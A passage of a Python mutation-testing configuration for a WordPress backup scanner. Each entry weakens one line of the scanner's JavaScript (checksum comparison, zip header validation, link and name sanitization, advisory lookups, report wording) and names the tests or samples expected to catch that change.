        "  for (const name of component.modified) reporter.report(`${rulePrefix}.modified`, name, {});\n", "",
        (sample("plugin_differs_from_wordpress_org"), sample("core_differs_from_wordpress_org")),
    ),
    switch_off(
        "extra file in a core folder", CHECKSUMS, "relative.startsWith('wp-admin/') || relative.startsWith('wp-includes/')",
        sample("core_differs_from_wordpress_org"),
    ),
    Mutation(
        "extra PHP in the root folder", CHECKSUMS,
        "} else if (!relative.includes('/') && PHP_EXTENSIONS.has(extensionOf(relative)) && !SITE_FILES.has(relative)) {",
        "} else if (false) {",
        (sample("core_differs_from_wordpress_org"),),
    ),
    Mutation(
        "wp-config.php counted as a stranger", CHECKSUMS,
        "const SITE_FILES = new Set(['wp-config.php']);", "const SITE_FILES = new Set([]);",
        (sample("clean"),),
    ),
    Mutation(
        "bundled themes and plugins judged as core code", CHECKSUMS,
        "const isCoreCode = !relative.startsWith('wp-content/');", "const isCoreCode = true;",
        (sample("core_differs_from_wordpress_org"),),
    ),
    switch_off(
        "missing official files not reported", CHECKSUMS, "component.missing.length > 0",
        sample("plugin_missing_official_files"), sample("core_differs_from_wordpress_org"),
    ),
    Mutation(
        "extra plugin files not reported", CHECKSUMS,
        "    if (name.startsWith(folder) && !answer.files.has(name.slice(folder.length))) {\n      component.extra.push({ entry, rule: '' });\n    }\n", "",
        (sample("plugin_with_files_wordpress_org_lacks"),),
    ),
    Mutation(
        "extra files in core folders not reported", CHECKSUMS,
        "    if (relative.startsWith('wp-admin/') || relative.startsWith('wp-includes/')) {\n      component.extra.push({ entry, rule: '' });\n    } else if",
        "    if",
        (sample("core_differs_from_wordpress_org"),),
    ),
    Mutation(
        "every extra PHP file called code", CHECKSUMS,
        "return holdsCode ? 'plugin.extra_php' : 'plugin.extra_file';", "return 'plugin.extra_php';",
        (sample("plugin_with_files_wordpress_org_lacks"),),
    ),
    Mutation(
        "no extra PHP file called code", CHECKSUMS,
        "return holdsCode ? 'plugin.extra_php' : 'plugin.extra_file';", "return 'plugin.extra_file';",
        (sample("plugin_with_files_wordpress_org_lacks"),),
    ),
    Mutation(
        "SHA-256 not compared", CHECKSUMS,
        "return expectation.sha256.includes(digests.sha256);", "return true;",
        (sample("plugin_differs_from_wordpress_org"),),
    ),
    Mutation(
        "MD5 not compared", CHECKSUMS,
        "return expectation.md5.includes(digests.md5);", "return true;",
        (sample("core_differs_from_wordpress_org"),),
    ),
    Mutation(
        "a file listed twice needs both lists", CHECKSUMS,
        "if (matching.length > 0) {", "if (matching.length === listedBy.length) {",
        (sample("plugin_file_also_in_core_list"),),
    ),
    Mutation(
        "any folder name sent as a slug", GATEWAY,
        "if (!SLUG_FORMAT.test(plugin.slug) || !VERSION_FORMAT.test(plugin.version))", "if (!VERSION_FORMAT.test(plugin.version))",
        ("test_lookups.py::test_a_folder_name_that_cannot_be_a_slug_is_not_sent",),
    ),
    Mutation(
        "no limit on requests", GATEWAY,
        "    if (requestsLeft === 0) return { outcome: 'request_limit' };\n", "",
        ("test_lookups.py::test_requests_stop_at_the_limit",),
    ),
    Mutation(
        "plugin directory never asked", GATEWAY,
        "const isUnknownThere = checksums.outcome === 'network'", "const isUnknownThere = false && checksums.outcome === 'network'",
        (
            "test_lookups.py::test_each_kind_of_answer_has_its_own_reason[not_listed]",
            "test_lookups.py::test_the_directory_is_asked_once_per_plugin",
        ),
    ),
    Mutation(
        "closed plugin not named", GATEWAY,
        "  if (status === 404 && body.closed === true) return { state: 'closed', closed: closure(body) };\n", "",
        (
            "test_lookups.py::test_each_kind_of_answer_has_its_own_reason[closed]",
            "test_advisories.py::test_a_closed_plugin_is_named_even_when_its_files_match",
        ),
    ),
    Mutation(
        "listed plugin without this version not named", GATEWAY,
        "  if (status === 200 && body.slug !== undefined) return { state: 'listed' };\n", "",
        ("test_lookups.py::test_each_kind_of_answer_has_its_own_reason[version_not_listed]",),
    ),
    Mutation(
        "closure not asked when the files match", GATEWAY,
        "  if (entry.state === 'closed') return { ...advisory, closed: entry.closed };\n", "",
        ("test_advisories.py::test_a_closed_plugin_is_named_even_when_its_files_match",),
    ),
    Mutation(
        "server error not named", GATEWAY,
        "  if (reply.status >= SERVER_ERROR_STATUS) return { ...advisory, state: 'unavailable' };\n", "",
        ("test_advisories.py::test_a_failed_lookup_has_its_own_reason[unavailable]",),
    ),
    Mutation(
        "theme without version looked up anyway", GATEWAY,
        "  if (!VERSION_FORMAT.test(component.version)) return { ...advisory, state: 'no_version' };\n", "",
        ("test_advisories.py::test_a_theme_without_a_version_is_not_looked_up",),
    ),
    Mutation(
        "version range ignored", ADVISORIES,
        "(entry) => inRange(entry.range, version)", "() => true",
        ("test_advisories.py::test_a_version_outside_every_range_has_none",),
    ),
    Mutation(
        "lower bound ignored", ADVISORIES,
        "(range.minOperator === '' || versionSatisfies(version, range.minOperator, range.min))", "true",
        ("test_advisories.py::test_a_version_outside_every_range_has_none",),
    ),
    Mutation(
        "upper bound ignored", ADVISORIES,
        "(range.maxOperator === '' || versionSatisfies(version, range.maxOperator, range.max))", "true",
        ("test_advisories.py::test_a_version_outside_every_range_has_none",),
    ),
    Mutation(
        "unfixed flag ignored", ADVISORIES,
        "unfixed: operator.unfixed === '1' || operator.unfixed === 1", "unfixed: false",
        ("test_advisories.py::test_entries_that_cover_the_version_are_listed",),
    ),
    Mutation(
        "error flag of the answer ignored", ADVISORIES,
        " || body.error !== 0) throw", ") throw",
        ("test_advisories.py::test_a_failed_lookup_has_its_own_reason[error_envelope]",),
    ),
    Mutation(
        "list of entries not checked", ADVISORIES,
        "  if (!Array.isArray(data.vulnerability) || data.vulnerability.length > MAX_ENTRIES) {", "  if (false) {",
        ("test_advisories.py::test_a_failed_lookup_has_its_own_reason[list_not_a_list]",),
    ),
    Mutation(
        "unreadable entry dropped in silence", "scanner/main.js",
        "    if (record.unreadable > 0) count('unreadable_entries', record, record.unreadable);\n", "",
        ("test_advisories.py::test_an_entry_that_cannot_be_judged_is_counted",),
    ),
    Mutation(
        "failed lookup not reported", "scanner/main.js",
        "    if (ADVISORY_FAILURES.has(record.state)) count(record.state, record, 0);\n", "",
        (sample("vulnerability_lookup_failed"), "test_advisories.py::test_an_unreachable_database_is_one_finding_for_all"),
    ),
    Mutation(
        "links from any host", ADVISORIES,
        "LINK_HOSTS.has(address.hostname) ? address.href", "address.href",
        ("test_advisories.py::test_only_known_sources_become_links",),
    ),
    Mutation(
        "links without https", ADVISORIES,
        "address.protocol === 'https:' && ", "",
        ("test_advisories.py::test_only_known_sources_become_links",),
    ),
    Mutation(
        "links with a user name", ADVISORIES,
        "address.username === '' && ", "",
        ("test_advisories.py::test_only_known_sources_become_links",),
    ),
    Mutation(
        "any text taken as an identifier", ADVISORIES,
        "typeof id === 'string' && IDENTIFIER_FORMAT.test(id)", "typeof id === 'string'",
        ("test_advisories.py::test_only_known_sources_become_links",),
    ),
    Mutation(
        "weakness name shown unsanitized", "scanner/main.js",
        "name: displayText(entry.weakness.name)", "name: entry.weakness.name",
        ("test_advisories.py::test_only_known_sources_become_links",),
    ),
    Mutation(
        "report does not wait for the lookup", "scanner/main.js",
        "      advisoriesDone.then(() => {", "      Promise.resolve().then(() => {",
        ("test_advisories.py::test_entries_that_cover_the_version_are_listed",),
    ),
    Mutation(
        "vulnerabilities asked before the checksums", "scanner/main.js",
        "checksumsDone.then(() => gateway.advisories(event))", "gateway.advisories(event)",
        ("test_lookups.py::test_requests_carry_names_and_versions_only",),
    ),
    Mutation(
        "switch ignored for the vulnerability lookup", "scanner/main.js",
        "    inventory: (event) => {\n      requireOnline();\n", "    inventory: (event) => {\n",
        ("test_advisories.py::test_an_offline_worker_cannot_ask_for_the_network",),
    ),
    Mutation(
        "requests go on after the scan ended", "scanner/main.js",
        "    gateway.stop();\n", "",
        ("test_advisories.py::test_a_finished_scan_starts_no_new_request",),
    ),
    Mutation(
        "theme version never read", ENGINE,
        "file === 'style.css'", "file === 'no-such-file'",
        ("test_advisories.py::test_a_theme_version_is_read_from_its_style_sheet",),
    ),
    Mutation(
        "versions compared as text", VERSION_COMPARE,
        "Math.sign(Number(leadingNumber(part1) - leadingNumber(part2)))", "Math.sign(part1.localeCompare(part2))",
        ("test_advisories.py::test_version_compare_matches_php",),
    ),
    Mutation(
        "special forms not ranked", VERSION_COMPARE,
        "  return found ? found[1] : -1;\n", "  return -1;\n",
        ("test_advisories.py::test_version_compare_matches_php",),
    ),
    Mutation(
        "trailing dot kept", VERSION_COMPARE,
        "return canonical.endsWith('.') ? canonical.slice(0, -1) : canonical;", "return canonical;",
        ("test_advisories.py::test_version_compare_matches_php",),
    ),
    Mutation(
        "no dot between digit and letter", VERSION_COMPARE,
        "      canonical += dot + character;\n", "      canonical += character;\n",
        ("test_advisories.py::test_version_compare_matches_php",),
    ),
    Mutation(
        "digests from wordpress.org not checked", GATEWAY,
        "\n    && digests.every((digest) => typeof digest === 'string' && format.test(digest));", ";",
        ("test_lookups.py::test_each_kind_of_answer_has_its_own_reason[bad_digest]",),
    ),
    Mutation(
        "failed connection not named", GATEWAY,
        "    if (error instanceof TypeError || error.name === 'AbortError') return { outcome: 'network' };\n", "",
        ("test_lookups.py::test_an_unreachable_wordpress_org_is_named_for_core_and_plugins",),
    ),

    switch_off("duplicate names", READER, "seen.has(entry.name)", sample("duplicate_name")),
    switch_off("header name compared", READER, "!sameBytes(localNameBytes, entry.nameBytes)", sample("header_mismatch[name]")),
    switch_off("header method compared", READER, "view.getUint16(8, true) !== entry.method", sample("header_mismatch[method]")),
    switch_off("header encryption flag compared", READER, "((flags & FLAG_ENCRYPTED) !== 0) !== entry.isEncrypted", sample("header_mismatch[encryption]")),
    switch_off("header sizes compared", READER, "!sizesAgree && !sizesDeferred", sample("header_mismatch[size]")),
    switch_off("header checksum compared", READER, "checksum !== entry.crc32 && !(deferred && checksum === 0)", sample("header_mismatch[checksum]")),
    switch_off("second name in the extra field", READER, "unicodeName !== null && unicodeName !== name", sample("second_name_in_extra_field")),
    switch_off("two end records", READER, "endingAtFileEnd.length > 1", sample("end_record_inside_comment")),
    switch_off("end records disagree", READER, "short[field] !== marker && short[field] !== wide[field]", sample("end_records_disagree")),
    switch_off("two tables of contents", READER, "declaredHolds && shiftedHolds", sample("two_tables")),
    Mutation(
        "table that continues past its declared size", READER,
        "problems.push(tableContinues", "problems.push(false",
        (sample("table_longer_than_declared"),),
    ),
    switch_off("table shorter than declared", READER, "at !== directory.length", sample("table_shorter_than_declared")),
    switch_off("multi-part archive", READER, "end.disk !== 0 || end.directoryDisk !== 0 || end.entriesOnDisk !== end.entriesTotal", sample("multi_part")),
    switch_off("entry limit", READER, "end.entriesTotal > maxEntries || end.directoryBytes > MAX_DIRECTORY_BYTES", sample("more_entries_than_accepted")),
    Mutation(
        "bytes after the archive not reported", READER,
        "    problems.push({ code: 'trailing_data', path: '', params: { bytes: tail.length - recordEnd } });\n", "",
        (sample("bytes_after_archive"),),
    ),

    Mutation(
        "names shown without replacing hidden characters", "scanner/sanitize.js",
        "String(raw).replace(NOT_DRAWN, codeLabel)", "String(raw)",
        (sample("deceptive_names"),),
    ),
    Mutation(
        "page accepts any rule from the worker", "scanner/protocol.js",
        "    if (!RULES.has(raw.rule) || RULES.get(raw.rule) !== raw.severity) throw new ProtocolError('unknown rule or weight');\n", "",
        (
            "test_page_behaviour.py::test_a_worker_that_breaks_the_protocol_ends_the_scan[unknown_rule]",
            "test_page_behaviour.py::test_a_worker_that_breaks_the_protocol_ends_the_scan[wrong_weight]",
        ),
    ),
    Mutation(
        "page reads a database entry that is not an object", "scanner/protocol.js",
        "        if (database === null || typeof database !== 'object') throw new ProtocolError('bad database');\n", "",
        ("test_page_behaviour.py::test_a_worker_that_breaks_the_protocol_ends_the_scan[null_database]",),
    ),
    Mutation(
        "past the drawn rows a red finding is dropped", PAGE_VIEW,
        "if (rankOf(lightest.dataset.severity) <= rankOf(finding.severity)) {", "if (true) {",
        ("test_page_behaviour.py::test_a_red_finding_past_the_drawn_rows_is_still_drawn",),
    ),
    Mutation(
        "findings of one file drawn as rows of their own", PAGE_VIEW,
        "  const listed = view.rowsByKey.get(key);\n", "  const listed = undefined;\n",
        ("test_page_behaviour.py::test_the_findings_of_one_file_share_one_row",),
    ),
    Mutation(
        "a row keeps its weight when a heavier finding of its file arrives", PAGE_VIEW,
        "    if (rankOf(finding.severity) < rankOf(listed.dataset.severity)) placeRow(view, listed, finding.severity);\n", "",
        ("test_page_behaviour.py::test_the_findings_of_one_file_share_one_row",),
    ),
    Mutation(
        "the reasons of a file kept in the order they arrived", PAGE_VIEW,
        "reasons.insertBefore(reason, lighter ?? null);", "reasons.append(reason);",
        ("test_page_behaviour.py::test_the_findings_of_one_file_share_one_row",),
    ),
    Mutation(
        "a weight per reason shown whatever the reasons weigh", PAGE_VIEW,
        "row.dataset.mixed = String(", "row.dataset.mixed = String(true || ",
        ("test_page_behaviour.py::test_the_findings_of_one_file_share_one_row",),
    ),
    Mutation(
        "a hash shown on a row that is not red", PAGE_VIEW,
        "    if (row.dataset.severity !== 'red') continue;\n", "",
        ("test_page_behaviour.py::test_the_findings_of_one_file_share_one_row",),
    ),
    Mutation(
        "the result left where it is when a scan starts", PAGE_VIEW,
        "  view.result.scrollIntoView(", "  void (",
        ("test_page_behaviour.py::test_a_scan_brings_its_result_into_view",),
    ),
    Mutation(
        "findings left out of the list are not told", PAGE_VIEW,
        "  line.textContent = LIST_TEXT.undrawnFindings(FINDINGS_DRAWN, view.undrawnFindings);\n", "",
        ("test_page_behaviour.py::test_a_red_finding_past_the_drawn_rows_is_still_drawn",),
    ),
    Mutation(
        "a weight sent as text added to the count", MAIN,
        "return typeof weight === 'number' ? weight : 1;", "return weight ?? 1;",
        ("test_page_behaviour.py::test_a_count_sent_as_text_weighs_one",),
    ),
    Mutation(
        "a failure past the engine left as a silent rejection", "scanner/worker.js",
        "      setTimeout(() => {\n        throw failure;\n      });\n", "",
        ("test_page_behaviour.py::test_a_failure_after_the_engine_ends_the_scan_at_once",),
    ),
    Mutation(
        "a throw while drawing the advisories left unhandled", MAIN,
        ".then(recordAdvisories).catch(failOn);", ".then(recordAdvisories, failOn);",
        ("test_page_behaviour.py::test_a_failure_while_drawing_the_advisories_ends_the_scan",),
    ),
    Mutation(
        "page accepts text of any length", "scanner/protocol.js",
        "typeof field !== 'string' || field.length > MAX_TEXT", "typeof field !== 'string'",
        ("test_page_behaviour.py::test_a_worker_that_breaks_the_protocol_ends_the_scan[oversized_text]",),
    ),
    Mutation(
        "watchdog off", "scanner/main.js",
        "if (awaitingNetwork || performance.now() - lastSignal < STALL_LIMIT_MS) return;", "return;",
        ("test_page_behaviour.py::test_a_silent_worker_is_stopped_and_reported",),
    ),
    Mutation(
        "watchdog counts the wait for wordpress.org as silence", "scanner/main.js",
        "if (awaitingNetwork || performance.now()", "if (performance.now()",
        ("test_lookups.py::test_the_watchdog_waits_while_wordpress_org_answers",),
    ),
    Mutation(
        "switch for the comparison ignored", "scanner/main.js",
        "worker.postMessage({ type: 'scan', file, online: report.online });", "worker.postMessage({ type: 'scan', file, online: true });",
        (sample("comparison_switched_off"), "test_page_behaviour.py::test_an_offline_scan_says_nothing_was_sent"),
    ),
    Mutation(
        "MD5 fed the whole buffer behind a view", "scanner/md5.js",
        "state.append(bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength));", "state.append(bytes.buffer);",
        ("test_lookups.py::test_md5_in_pieces_equals_md5_of_the_whole",),
    ),
    Mutation(
        "findings listed in the order they arrived", PAGE_VIEW,
        "view.findings.insertBefore(row, lighter ?? view.findings.querySelector(", "view.findings.insertBefore(row, view.findings.querySelector(",
        ("test_page_behaviour.py::test_findings_are_listed_heaviest_first",),
    ),
    Mutation(
        "log does not follow its last line", PAGE_VIEW,
        "    while (list.children.length > LOG_LINES_KEPT) list.firstElementChild.remove();\n    if (wasAtEnd) list.scrollTop = list.scrollHeight;\n",
        "    while (list.children.length > LOG_LINES_KEPT) list.firstElementChild.remove();\n",
        ("test_page_behaviour.py::test_the_log_ends_on_its_last_line",),
    ),
    Mutation(
        "a result without findings called safe", "scanner/messages-en.js",
        "That is not a clean bill, and running the copy on Windows is still a risk.", "The copy is safe.",
        ("test_page_behaviour.py::test_a_result_without_findings_is_never_called_clean",),
    ),
    Mutation(
        "one of a counted thing named in the plural", "scanner/messages-en.js",
        "${count === 1 ? one : many}", "${many}",
        ("test_page_report.py::test_compared_components_are_listed",),
    ),
    Mutation(
        "a single always-loaded file named in the plural", "scanner/messages-en.js",
        "loadedCode: (total) => (total === 1\n", "loadedCode: (total) => (total === 0\n",
        ("test_page_report.py::test_one_file_that_always_runs_is_named_in_the_singular",),
    ),
    Mutation(
        "the only red finding counted as one of one", "scanner/messages-pl.js",
        "  if (total === 1) return 'Jedyne czerwone znalezisko pochodzi';\n", "",
        ("test_page_report.py::test_the_polish_page_speaks_polish",),
    ),
    Mutation(
        "a failed worker named in English words", MAIN,
        "new Map([['error', 'ErrorEvent']])", "new Map([['error', 'worker error']])",
        ("test_page_behaviour.py::test_a_failure_after_the_engine_ends_the_scan_at_once",),
    ),
    Mutation(
        "a core wordpress.org does not know called a plugin", "scanner/messages-en.js",
        "kind === 'core' && reason === 'not_listed' ? CORE_NOT_LISTED : ", "",
        ("test_page_report.py::test_a_core_wordpress_org_does_not_know_is_not_called_a_plugin",),
    ),
    Mutation(
        "the kind of a component left in the scanner's own words", "scanner/messages-pl.js",
        "`${ADVISORY_KINDS.get(kind) ?? ''} ${name}`.trim()", "`${kind} ${name}`",
        ("test_page_report.py::test_the_polish_page_names_a_component_in_polish",),
    ),
    Mutation(
        "a finding about the whole copy drawn with an empty path", PAGE_VIEW,
        "    finding.path === ''\n      ? textElement", "    false\n      ? textElement",
        (
            "test_page_report.py::test_a_finding_about_the_whole_copy_is_labelled_where_a_path_would_be",
            "test_page_report.py::test_the_polish_page_labels_the_whole_copy_in_polish",
        ),
    ),
    Mutation(
        "a finding about the whole copy reported with an empty path", "scanner/report-export.js",
        "const lines = [`- ${placeOf(finding)}`", "const lines = [`- ${finding.path}`",
        ("test_page_report.py::test_a_finding_about_the_whole_copy_is_labelled_where_a_path_would_be",),
    ),
    Mutation(
        "a finding about the whole copy logged with an empty path", MAIN,
        "log.line(`! ${displayText(placeOf(finding))}:", "log.line(`! ${displayText(finding.path)}:",
        ("test_page_report.py::test_a_finding_about_the_whole_copy_is_labelled_where_a_path_would_be",),
    ),
    Mutation(
        "the count of findings past a rule's cap called the whole copy", "scanner/messages.js",
        "return countsOtherPlaces ? LIST_TEXT.moreFindings : LIST_TEXT.wholeCopy;", "return LIST_TEXT.wholeCopy;",
        (
            "test_page_report.py::test_findings_past_a_rules_cap_name_the_file_they_resemble",
            "test_page_report.py::test_a_finding_without_a_path_is_placed_by_what_it_counts",
        ),
    ),
    Mutation(
        "a finding about the whole copy with an example called other places", "scanner/messages.js",
        "finding.params.more !== undefined && (finding.params.example ?? '') !== ''", "(finding.params.example ?? '') !== ''",
        ("test_page_report.py::test_a_finding_without_a_path_is_placed_by_what_it_counts",),
    ),
    Mutation(
        "the count of a rule about the whole copy called other places", "scanner/messages.js",
        "finding.params.more !== undefined && (finding.params.example ?? '') !== ''", "finding.params.more !== undefined",
        ("test_page_report.py::test_a_finding_without_a_path_is_placed_by_what_it_counts",),
    ),
    Mutation(
        "the count of findings past a rule's cap drawn in the whole copy's row", PAGE_VIEW,
        "finding.path === '' ? `\\u{0}${placeOf(finding)}` : finding.path", "finding.path",
        ("test_page_report.py::test_findings_past_a_rules_cap_name_the_file_they_resemble",),
    ),
    Mutation(
        "the count of findings past a rule's cap names no file", ENGINE,
        "example: firstPaths.get(rule) ?? ''", "example: ''",
        ("test_page_report.py::test_findings_past_a_rules_cap_name_the_file_they_resemble",),
    ),
    Mutation(
        "the count of findings past a rule's cap names the last file, not the first", ENGINE,
        "if (!firstPaths.has(rule)) firstPaths.set(rule, path);", "firstPaths.set(rule, path);",
        ("test_page_report.py::test_findings_past_a_rules_cap_name_the_file_they_resemble",),
    ),
    Mutation(
        "every PHP file straight in wp-content counted as always loaded", ENGINE,
        "if (inside.length === 1) return isDropIn(inside[0]);", "if (inside.length === 1) return true;",
        (
            sample("content_php_that_is_not_a_drop_in"),
            "test_page_report.py::test_the_always_loaded_list_holds_what_wordpress_loads_by_itself",
        ),
    ),
    Mutation(
        "a drop-in named in capitals left off the always-loaded list", ENGINE,
        "DROP_INS.has(name.toLowerCase())", "DROP_INS.has(name)",
        (sample("drop_in_in_capitals_runs_program"),),
    ),
    Mutation(
        "a quiet PHP file straight in wp-content not named", ENGINE,
        "return isDropIn(parts[1]) ? null : `${siteFolder}${parts[0]}/`;", "return null;",
        (sample("quiet_content_php_that_is_not_a_drop_in"),),
    ),
    Mutation(
        ".maintenance not read as code", ENGINE,
        " || isMaintenanceFile(entry.name))\n", ")\n",
        (sample("maintenance_file_runs_program"),),
    ),
    Mutation(
        ".maintenance not on the always-loaded list", ENGINE,
        "  if (isMaintenanceFile(path)) return maintenanceFolders.has(folderOf(path));\n", "",
        (
            sample("maintenance_file_runs_program"),
            "test_page_report.py::test_the_always_loaded_list_holds_what_wordpress_loads_by_itself",
        ),
    ),
    Mutation(
        "a .maintenance in any folder put on the list", ENGINE,
        "return maintenanceFolders.has(folderOf(path));", "return true;",
        (sample("config_and_maintenance_where_wordpress_does_not_read_them"), sample("maintenance_beside_core_only")),
    ),
    Mutation(
        "a .maintenance in any site folder put on the list, not only where WordPress runs from", ENGINE,
        "maintenanceFolders: runFolders,", "maintenanceFolders: siteFolders,",
        (sample("maintenance_beside_core_only"),),
    ),
    Mutation(
        "a .maintenance in a copy without a core left off the list", ENGINE,
        "maintenanceFolders: runFolders,", "maintenanceFolders: coreFolders,",
        (sample("maintenance_in_a_copy_without_core"), sample("two_copies_without_core")),
    ),
    Mutation(
        "the cores left out of the folders WordPress runs from", ENGINE,
        "const runFolders = new Set([...coreFolders, ...copies]);", "const runFolders = new Set(copies);",
        (sample("maintenance_beside_core_only"), sample("core_kept_inside_wp_content")),
    ),
    Mutation(
        "a folder holding a core and a wp-content taken for a copy", ENGINE,
        ".filter((folder) => !coreFolders.has(folder) && !contentOfCoresBelow.has(folder));",
        ".filter((folder) => !contentOfCoresBelow.has(folder));",
        (sample("config_and_maintenance_in_a_site_folder"),),
    ),
    Mutation(
        "the folder above a core kept in wp/ taken for a copy", ENGINE,
        ".filter((folder) => !coreFolders.has(folder) && !contentOfCoresBelow.has(folder));",
        ".filter((folder) => !coreFolders.has(folder));",
        (sample("maintenance_beside_core_only"),),
    ),
    Mutation(
        "a core with a wp-content of its own taken for one kept apart", ENGINE,
        "if (!contentFolders.has(core) && contentFolders.has(above) && !coreFolders.has(above)) keptApart.set(core, above);",
        "if (contentFolders.has(above) && !coreFolders.has(above)) keptApart.set(core, above);",
        (sample("copy_at_the_top_beside_a_second_install"),),
    ),
    Mutation(
        "a second core inside a full site taken for one kept apart", ENGINE,
        "if (!contentFolders.has(core) && contentFolders.has(above) && !coreFolders.has(above)) keptApart.set(core, above);",
        "if (!contentFolders.has(core) && contentFolders.has(above)) keptApart.set(core, above);",
        (sample("bare_second_core_inside_a_site"),),
    ),
    Mutation(
        "with no core, the site's own folder not run from", ENGINE,
        "  if (siteCopy !== null) runFolders.add(siteCopy);\n", "",
        (sample("config_without_core_or_content"), sample("copy_without_core_nearer_the_top_than_the_site")),
    ),
    Mutation(
        "with no core, the site's own copy named as not compared", ENGINE,
        "const others = copies.filter((folder) => folder !== siteCopy);", "const others = copies;",
        (sample("maintenance_in_a_copy_without_core"),),
    ),
    Mutation(
        "the site's own copy looked for beside a core too", ENGINE,
        "const siteCopy = coreFolders.size > 0 ? null : siteCopyOf(", "const siteCopy = siteCopyOf(",
        (sample("backslash_site_with_a_config_above"),),
    ),
    Mutation(
        "a wp-content inside another taken for a copy WordPress runs from", ENGINE,
        "\n    const contentAt = parts.findIndex((part) => part.toLowerCase() === CONTENT_FOLDER);",
        "\n    const contentAt = parts.findLastIndex((part) => part.toLowerCase() === CONTENT_FOLDER);",
        (sample("copy_kept_inside_wp_content"),),
    ),
    Mutation(
        "a file named wp-content taken for a copy", ENGINE,
        "if (contentAt < 0 || contentAt === parts.length - 1) continue;", "if (contentAt < 0) continue;",
        (sample("file_named_wp_content"),),
    ),
    Mutation(
        "macOS Finder's __MACOSX folder taken for part of the site", ENGINE,
        "const siteEntries = entries.filter((entry) => !isMacMetadata(entry.name));", "const siteEntries = entries;",
        (sample("site_zipped_by_macos_finder"),),
    ),
    Mutation(
        "a wp-config.php template inside a wp-content taken for the site's", ENGINE,
        "endsWithPathPart(entry.name, CONFIG_FILE) && !isInsideContent(entry.name)));", "endsWithPathPart(entry.name, CONFIG_FILE)));",
        (sample("config_template_in_a_backup_of_wp_content"),),
    ),
    Mutation(
        "with no core and no wp-config.php, the top of the archive taken for the site", ENGINE,
        "siteCopyOf(configEntry ? root : null, contentFolders)", "siteCopyOf(root, contentFolders)",
        (sample("copies_without_core_or_config"),),
    ),
    Mutation(
        "with no core and no wp-config.php, the first copy in the zip taken for the site", ENGINE,
        "const byDepth = [...contentFolders.keys()].sort((left, right) => left.split('/').length - right.split('/').length || left.localeCompare(right));",
        "const byDepth = [...contentFolders.keys()];",
        (sample("copies_without_core_or_config"),),
    ),
    Mutation(
        "with no core, no wp-config.php and no copy, nowhere taken for the folder WordPress runs from", ENGINE,
        "  return byDepth[0] ?? '';", "  return byDepth[0] ?? null;",
        (sample("lone_config_in_capitals"),),
    ),
    Mutation(
        "a copy of wp-content with no core and no wp-config.php not taken for WordPress", ENGINE,
        "Boolean(versionEntry || configEntry || entries.some(", "Boolean(versionEntry || configEntry || false && entries.some(",
        (sample("backup_of_wp_content_alone"),),
    ),
    Mutation(
        "with no core, the plugins looked for beside the top of the archive", ENGINE,
        "const folder = siteCopy ?? keptApart.get(", "const folder = keptApart.get(",
        (sample("backup_of_wp_content_alone"),),
    ),
    Mutation(
        "a part of wp-content read as written", ENGINE,
        "  if (!isContentPart(written.entries)) return null;", "  return null;",
        (sample("updraftplus_plugins_part"), sample("updraftplus_others_part"), sample("updraftplus_uploads_part")),
    ),
    Mutation(
        "a part's folders shown with wp-content in front", ENGINE,
        "names.show(archive, isPart ? CONTENT_PART_FOLDER : '');", "names.show(archive, '');",
        (sample("updraftplus_others_part"), "test_report_details.py::test_a_part_of_wp_content_is_reported_under_the_names_it_holds"),
    ),
    *(
        Mutation(
            f"a part's {what} shown with wp-content in front", ENGINE, line, "",
            ("test_report_details.py::test_a_part_of_wp_content_is_reported_under_the_names_it_holds",),
        )
        for what, line in {
            "examples": "      if (typeof shown.params?.example === 'string') shown.params = { ...shown.params, example: written(shown.params.example) };\n",
            "listed and hashed files": "      if (Array.isArray(shown.files)) shown.files = withPaths(shown.files);\n",
            "database dumps": "      if (Array.isArray(shown.databases)) shown.databases = withPaths(shown.databases);\n",
        }.items()
    ),
    Mutation(
        "names read as written, not as unpacked", ENGINE,
        "const unpacked = asUnpacked(opened);", "const unpacked = opened;",
        (sample("always_loaded_code_written_with_dot_segments"), sample("updraftplus_part_written_with_a_dot_folder")),
    ),
    Mutation(
        "a name's dots and spaces at the end of a segment kept", ENGINE,
        "const unpacked = segment === '..' ? segment : stripTrailingDotsAndSpaces(segment);", "const unpacked = segment === '.' ? '' : segment;",
        (sample("mu_plugins_written_with_trailing_dots_and_spaces"),),
    ),
    Mutation(
        "a '..' segment unpacked to nothing", ENGINE,
        "const unpacked = segment === '..' ? segment : stripTrailingDotsAndSpaces(segment);", "const unpacked = stripTrailingDotsAndSpaces(segment);",
        (sample("layout_mix"),),
    ),
    Mutation(
        "an empty segment kept in a name", ENGINE,
        "const SEPARATOR_RUNS = /([\\\\/])[\\\\/]+/g;", "const SEPARATOR_RUNS = /(x)(?!x)x/g;",
        (sample("always_loaded_code_written_with_dot_segments"),),
    ),
    Mutation(
        "the leading empty segment of an absolute name dropped", ENGINE,
        "    const staysEmpty = segment === '';\n", "    const staysEmpty = segment === '' && at > 0;\n",
        (sample("climbing_name_written_with_a_dot_segment"),),
    ),
    Mutation(
        "a final '.' segment kept with its separator", ENGINE,
        "      kept.push(kept.pop().slice(0, -1));\n", "",
        (sample("always_loaded_code_written_with_a_final_dot_segment"),),
    ),
    Mutation(
        "a name that unpacks to nothing used as a name", ENGINE,
        "if (name !== entry.name && name !== '') tidied.set(entry, name);", "if (name !== entry.name) tidied.set(entry, name);",
        (sample("folder_entry_that_unpacks_to_nothing"),),
    ),
    Mutation(
        "names inside a nested zip read as written", ENGINE,
        "const archive = asUnpacked(opened.archive);", "const archive = opened.archive;",
        (sample("names_with_dot_segments_inside_a_nested_zip"),),
    ),
    Mutation(
        "names inside a nested zip shown as checked", ENGINE,
        "`${outerName}${NESTED_SEPARATOR}${writtenOf.get(path) ?? path}`", "`${outerName}${NESTED_SEPARATOR}${path}`",
        (sample("names_with_dot_segments_inside_a_nested_zip"),),
    ),
    Mutation(
        "two dotted spellings of one name not flagged", ENGINE,
        "    seen.add(name);\n  }\n  return { ...archive, entries, problems };", "  }\n  return { ...archive, entries, problems };",
        (sample("two_dotted_spellings_of_one_name"),),
    ),
    Mutation(
        "a backslash no separator when tidying a name", ENGINE,
        "const pieces = flattened.split(/([\\\\/])/);", "const pieces = flattened.split(/(\\/)/);",
        (sample("mu_plugin_written_with_a_backslash_dot"),),
    ),
    Mutation(
        "two entries landing on one name not flagged", ENGINE,
        "    if (seen.has(name)) problems.push({ code: 'duplicate_name', path: name, params: {} });\n", "",
        (sample("mu_plugin_written_twice_through_a_dot_segment"),),
    ),
    Mutation(
        "the zip reader's findings left under the written name", ENGINE,
